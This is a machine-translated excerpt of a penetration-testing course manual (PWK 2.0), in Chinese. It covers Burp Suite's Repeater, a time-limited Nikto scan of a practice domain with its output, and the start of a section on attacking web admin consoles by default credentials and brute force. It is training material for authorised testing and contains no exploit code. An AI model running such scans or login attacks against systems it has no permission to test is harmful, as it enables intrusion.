<div style="position:absolute;top:60685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:60685;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:60685;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">271</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，借助</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Repeater</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具，我们可以轻松修改请求、重新发送请求并查看请求</font></font></nobr></div>
<div style="position:absolute;top:59723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回应。</font><font style="vertical-align: inherit;">要查看此操作，我们可以右键单击来自</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 历史记录</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的请求，</font><font style="vertical-align: inherit;">然后选择</font></font></nobr></div>
<div style="position:absolute;top:59742;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送到中继器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60230;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 114：向中继器发送请求 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:60763;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="52"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 52 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:60796;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:61873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:61873;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:61873;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">272</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:60886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.17</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Repeater</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们将在窗口左侧有一个带有请求的子选项卡。</font></font></nobr></div>
<div style="position:absolute;top:60926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以向 Repeater 发送多个请求，它会在单独的选项卡上显示它们。</font><font style="vertical-align: inherit;">我们可以发送</font></font></nobr></div>
<div style="position:absolute;top:60945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Send</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向服务器</font><i><font style="vertical-align: inherit;">发送</font></i><font style="vertical-align: inherit;">请求</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61433;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 115：Burp Suite 中继器 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:61951;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="53"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 53 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:61984;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:63061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:63061;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:63061;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">273</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:62074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.18</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Burp Suite 将在窗口右侧显示原始服务器响应，其中包括</font></font></nobr></div>
<div style="position:absolute;top:62114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">响应标头和未呈现的响应内容。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62601;left:287"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 116：带有请求和响应的 Burp Suite 中继器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们提交和修改时，Web 应用程序的利用通常需要大量的反复试验</font></font></nobr></div>
<div style="position:absolute;top:62651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求并监视响应。</font><font style="vertical-align: inherit;">中继器对此非常有用，因为我们可以快速调整</font></font></nobr></div>
<div style="position:absolute;top:62671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求的元素并重新发送它们，而无需等待我们的浏览器呈现每个响应。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:62705;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.4 日东</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62743;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nikto </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">248</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个高度可配置的开源 Web 服务器扫描器，可测试数千个</font></font></nobr></div>
<div style="position:absolute;top:62763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">危险文件和程序、易受攻击的服务器版本和各种服务器配置问题。</font></font></nobr></div>
<div style="position:absolute;top:62782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它表现良好，但不是为隐身而设计的，因为它会发送许多请求并嵌入信息</font></font></nobr></div>
<div style="position:absolute;top:62802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于自身在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">User-Agent </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">249</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标头中。</font></font></nobr></div>
<div style="position:absolute;top:62834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nikto 可以扫描多个服务器和端口，并且会尽可能多地扫描它可以找到的页面。</font><font style="vertical-align: inherit;">在网站上</font></font></nobr></div>
<div style="position:absolute;top:62853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大量内容，例如电子商务网站，Nikto 扫描可能需要几个小时才能完成。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:62873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有两个选项来控制扫描持续时间。</font><font style="vertical-align: inherit;">最简单的选项是设置</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-maxtime</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，</font></font></nobr></div>
<div style="position:absolute;top:62892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将在指定的时间限制后停止扫描。</font><font style="vertical-align: inherit;">这不会以任何方式优化扫描。</font></font></nobr></div>
<div style="position:absolute;top:62912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nikto 将简单地停止扫描。</font><font style="vertical-align: inherit;">我们的第二个选项是</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-T</font></font></b><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">将扫描</font><font style="vertical-align: inherit;">调整为</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">250</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们可以</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:62971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">248 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（CIRT.net，2019 年），https://cirt.net/Nikto2</font></font></font></nobr></div>
<div style="position:absolute;top:62991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">249 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/User_agent</font></font></font></nobr></div>
<div style="position:absolute;top:63011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">250 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（CIRT.net，2019 年），https://cirt.net/nikto2-docs/options.html#id2791140</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:63139;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="54"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 54 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:63172;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:64249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:64249;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:64249;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">274</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用此功能来控制我们要运行的测试类型。</font><font style="vertical-align: inherit;">有些时候我们不</font></font></nobr></div>
<div style="position:absolute;top:63287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">想要运行 Nikto 内置的所有测试，例如验证某类漏洞是否存在</font></font></nobr></div>
<div style="position:absolute;top:63306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">展示。</font><font style="vertical-align: inherit;">在这些情况下，调整扫描非常重要。</font></font></nobr></div>
<div style="position:absolute;top:63339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nikto 尤其适用于捕捉低垂的果实、报告非标准服务器标头以及</font></font></nobr></div>
<div style="position:absolute;top:63359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">捕获服务器配置错误。</font></font></nobr></div>
<div style="position:absolute;top:63391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了证明这一点，让我们针对 www.megacorpone.com 运行 Nikto。</font><font style="vertical-align: inherit;">我们将指定我们的主机</font></font></nobr></div>
<div style="position:absolute;top:63411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">想要扫描（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-host=http://www.megacorpone.com</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）并且为了这个演示，</font></font></nobr></div>
<div style="position:absolute;top:63430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-maxtime=30s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将扫描持续时间限制为 30 秒：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:63465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nikto -host=http://www.megacorpone.com -maxtime=30s</font></font></font></b></nobr></div>
<div style="position:absolute;top:63482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- Nikto v2.1.6</font></font></nobr></div>
<div style="position:absolute;top:63499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -------------------------</font></font></nobr></div>
<div style="position:absolute;top:63516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 目标 IP：    </font></font></nobr></div>
<div style="position:absolute;top:63516;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38.100.193.76</font></font></nobr></div>
<div style="position:absolute;top:63533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 目标主机名：www.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:63550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 目标端口：    </font></font></nobr></div>
<div style="position:absolute;top:63550;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80</font></font></nobr></div>
<div style="position:absolute;top:63567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -------------------------</font></font></nobr></div>
<div style="position:absolute;top:63584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 服务器：Apache/2.2.22 (Ubuntu)</font></font></nobr></div>
<div style="position:absolute;top:63601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 服务器可能会通过 ETags 泄漏 inode，头文件 /，inode：</font></font></nobr></div>
<div style="position:absolute;top:63618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">152243，大小：12519，时间：2019 年 5 月 17 日星期五 06:26:28</font></font></nobr></div>
<div style="position:absolute;top:63635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 不存在反点击劫持 X-Frame-Options 标头。</font></font></nobr></div>
<div style="position:absolute;top:63652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ X-XSS-Protection 标头未定义。</font><font style="vertical-align: inherit;">这个标题可以暗示</font></font></nobr></div>
<div style="position:absolute;top:63669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防止某些形式的 XSS 的用户代理</font></font></nobr></div>
<div style="position:absolute;top:63686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 未设置 X-Content-Type-Options 标头。</font><font style="vertical-align: inherit;">这可以让</font></font></nobr></div>
<div style="position:absolute;top:63703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户代理以不同的方式呈现网站的内容</font></font></nobr></div>
<div style="position:absolute;top:63720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MIME 类型</font></font></nobr></div>
<div style="position:absolute;top:63737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 未找到 CGI 目录（使用“-C all”强制检查所有可能的目录）</font></font></nobr></div>
<div style="position:absolute;top:63754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ "robots.txt" 包含 1 个应手动查看的条目。</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:63770;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ Apache/2.2.22 似乎已经过时（目前至少是</font></font></b></nobr></div>
<div style="position:absolute;top:63787;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache/2.4.37）。</font><font style="vertical-align: inherit;">Apache 2.2.34 是 2.x 分支的 EOL。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:63805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 错误：主机最大执行时间达到 30 秒</font></font></nobr></div>
<div style="position:absolute;top:63822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 错误：主机最大执行时间达到 30 秒</font></font></nobr></div>
<div style="position:absolute;top:63838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 扫描终止：远程主机上报告了 0 个错误和 6 个项目</font></font></nobr></div>
<div style="position:absolute;top:63855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 结束时间：    </font></font></nobr></div>
<div style="position:absolute;top:63855;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-06-05 11:22:35 (GMT-4)（31 秒）</font></font></nobr></div>
<div style="position:absolute;top:63872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -------------------------</font></font></nobr></div>
<div style="position:absolute;top:63889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 1 台主机测试</font></font></nobr></div>
<div style="position:absolute;top:63909;left:287"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 283 - 对 www.megacorpone.com 运行 nikto</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管我们限制了扫描持续时间，清单 283 中的输出仍然提供了一些有趣的信息</font></font></nobr></div>
<div style="position:absolute;top:63958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息。</font><font style="vertical-align: inherit;">例如，它识别出服务器上运行的 Apache 版本已超出</font></font></nobr></div>
<div style="position:absolute;top:63977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日期并超过其使用寿命。</font></font></nobr></div>
<div style="position:absolute;top:64009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个简短的介绍中，我们只展示了 Kali Linux 中可用工具的一小部分，</font></font></nobr></div>
<div style="position:absolute;top:64029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是到目前为止我们介绍的工具将很好地为我们接下来的演示服务</font></font></nobr></div>
<div style="position:absolute;top:64048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块的。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:64083;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 花一些时间查看 Web 应用程序分析下可用的应用程序</font></font></nobr></div>
<div style="position:absolute;top:64132;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 中的菜单。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:64327;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="55"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 55 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:64360;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:65437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:65437;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:65437;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">275</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:64456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4 利用基于 Web 的漏洞</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经介绍了枚举并了解了如何使用一些基本工具，我们将</font></font></nobr></div>
<div style="position:absolute;top:64517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将我们的注意力转向漏洞利用。</font><font style="vertical-align: inherit;">在本节中，我们将讨论基于网络的</font></font></nobr></div>
<div style="position:absolute;top:64536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理控制台并专注于特定漏洞，例如跨站点脚本、目录</font></font></nobr></div>
<div style="position:absolute;top:64556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">遍历、文件包含、SQL 注入等。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:64590;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1 利用管理控制台</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们从管理控制台枚举和利用开始。</font><font style="vertical-align: inherit;">一旦我们找到管理员</font></font></nobr></div>
<div style="position:absolute;top:64647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制台，最简单的“利用”就是登录它。</font><font style="vertical-align: inherit;">我们可能会尝试默认用户名/密码</font></font></nobr></div>
<div style="position:absolute;top:64666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对，使用枚举信息来猜测工作凭据，或尝试蛮力。</font></font></nobr></div>
<div style="position:absolute;top:64699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，轻触通常最好使用蛮力。</font><font style="vertical-align: inherit;">帐户锁定将对我们产生负面影响</font></font></nobr></div>
<div style="position:absolute;top:64719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试，将阻止合法管理员，并可能提醒</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蓝队</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">251</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的存在。</font></font></nobr></div>
<div style="position:absolute;top:64738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与往常一样，我们必须仔细权衡每个攻击向量的风险，并以最佳状态谨慎行事</font></font></nobr></div>
<div style="position:absolute;top:64757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们客户的利益。</font></font></nobr></div>
<div style="position:absolute;top:64790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管存在这些风险，被入侵的管理控制台仍是主要目标，它可能使我们能够</font></font></nobr></div>
<div style="position:absolute;top:64810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在服务器上部署和运行代码，这可以提供到 shell 的快速路径。</font></font></nobr></div>
<div style="position:absolute;top:64842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了证明这一点，我们将通过一个针对配置不佳的攻击的示例进行工作</font></font></nobr></div>
<div style="position:absolute;top:64862;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理控制台安装在我们的 Windows 10 目标上。</font><font style="vertical-align: inherit;">请注意，其余部分使用的 IP 地址</font></font></nobr></div>
<div style="position:absolute;top:64881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此模块可能与您的实验室不匹配。</font><font style="vertical-align: inherit;">有关分配的 IP 地址，请参阅实验指南。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:65387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">251 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Blue_team_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(computer_security)</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:65515;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="56"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 56 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:65548;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:66625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:66625;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:66625;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">276</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:65638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将通过打开 XAMPP 控制面板并单击来设置 Windows 10 目标</font></font></nobr></div>
<div style="position:absolute;top:65678;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache 和 MySQL 开始。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66165;left:364"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 117：XAMPP 控制面板</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们</font><font style="vertical-align: inherit;">将从 Kali</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dirb</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，以我们的 Windows 10 机器为目标。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
